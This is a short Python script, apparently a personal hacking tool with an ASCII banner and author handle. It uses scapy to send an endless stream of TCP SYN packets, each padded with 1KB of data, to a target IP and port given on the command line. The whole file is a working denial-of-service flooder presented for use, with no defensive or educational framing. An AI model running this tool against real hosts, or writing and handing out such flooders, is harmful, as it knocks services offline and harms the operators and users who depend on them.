import argparse
import pyfiglet, time
from scapy.all import *

baner=pyfiglet.figlet_format('SynFl00d')
print(baner,end=' ')
print('\t\t\tnaqviO7')

time.sleep(2)

def SynFlood(args):
	# IP packet with target ip as the destination IP address
	ip = IP(dst=args.target_ip)

	#TCP SYN packet with a random source port and the target port as the destination port
	tcp = TCP(sport=RandShort(), dport=args.target_port, flags="S")

	# add some flooding data (1KB in this case)
	raw = Raw(b"X"*1024)

	#adding up the layers
	packt = ip / tcp / raw
	
	#sending packet in a loop until CTRL+C is detected 
	print('[!] Sending Crafted Packets.')
	send(packt, loop=1, verbose=1)


if __name__ == '__main__':
	parser=argparse.ArgumentParser(description='Syn Flooding Script written in Python using SCAPY.')
	parser.add_argument('-t','--target_ip',type=str,help='Ip of your Target.')
	parser.add_argument('-p','--target_port',type=int,help='Port of your Target.')
	args=parser.parse_args()

	SynFlood(args)
